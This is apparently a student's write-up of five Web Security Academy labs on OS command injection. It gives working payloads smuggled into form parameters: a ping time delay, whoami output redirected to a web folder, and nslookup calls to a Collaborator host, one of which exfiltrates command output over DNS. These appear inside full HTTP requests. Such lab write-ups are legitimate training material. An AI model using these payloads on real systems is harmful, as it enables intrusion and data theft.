# OS Command Injection Labs

## 1. OS command injection, simple case

1. View any item and check the stock
2. Inject the `whoami` command into the storeId parameter

![[attachments/os-command-injection/file-20260206135415873.png]]

## 2. Blind OS command injection with time delays

1. Note that there is a feedback form. Send feedback and observe the request
2. Try injecting the following into various parameters

```
POST /feedback/submit HTTP/2
Host: 0aeb00a5048a81ac8061e45100e20050.web-security-academy.net
Cookie: session=KNQIdlUAsWedsKHbCQYUejDX6K9hbMJd
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://0aeb00a5048a81ac8061e45100e20050.web-security-academy.net
Referer: https://0aeb00a5048a81ac8061e45100e20050.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=Om45yXy8tgIZyMaRAoOtwSj6qX5vIHFC&name=tester1&email=tester1%40test.com%26ping+-c+10+127.0.0.1%26&subject=test&message=This+is+a+test
```

3. Note that when injecting into the email parameter the application takes about 10 seconds to respond and the lab is solved.

## 3. Blind OS command injection with output redirection

> [!tip]-
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
> 
> `/var/www/images/`

1. Note the submit feedback form again
2. Send feedback and send the request to repeater
3. Add the following to the email parameter:

```
||whoami>/var/www/images/whoami.txt||
```

4. Now send any of the image requests to repeater and change the filename to `whoami.txt` as follows to solve the lab

```
https://0aca00f6049581f680b9e98500570091.web-security-academy.net/image?filename=whoami.txt
```

## 4. Blind OS command injection with out-of-band interaction

1. Send feedback and then send the request to repeater
2. Inject an nslookup command into the email parameter

```
POST /feedback/submit HTTP/2
Host: 0ac00099043c628984dc903a00fe00dd.web-security-academy.net
Cookie: session=apIFXuAFuJyfW5YDtdCyQ2HXyV7jqso7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Origin: https://0ac00099043c628984dc903a00fe00dd.web-security-academy.net
Referer: https://0ac00099043c628984dc903a00fe00dd.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=cSxRYGUuCol75ftt30OKg81qWZ4idXK8&name=tester1&email=tester1%40test.com%26nslookup+6v2h6a9xvj80rl9zk6njzl9lpcv3jt7i.oastify.com%26&subject=test&message=test
```

3. Notice that we get a DNS lookup to collaborator and the lab is solved

![[attachments/os-command-injection/file-20260206135415874.png]]

## 5. Blind OS command injection with out-of-band data exfiltration

1. Submit feedback and send the request to repeater
2. Inject the following into the email parameter

```
POST /feedback/submit HTTP/2
Host: 0a5f00a403548f6280bd62f600f7008d.web-security-academy.net
Cookie: session=qPdKFnrBAYXYQKHN1UxTIBsjnpGUfACt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
Origin: https://0a5f00a403548f6280bd62f600f7008d.web-security-academy.net
Referer: https://0a5f00a403548f6280bd62f600f7008d.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=hq8qrSwSYvZfQfH1gRR89msIEMLcwMRq&name=tester1&email=tester1%40test.com%26nslookup+`whoami`.7ckinbqyckp18mq0174kgmqm6dc40vok.oastify.com%26&subject=test&message=test
```

3. Note that we get a DNS lookup containing the output of the `whoami` command as a subdomain
4. Submit that value to solve the lab

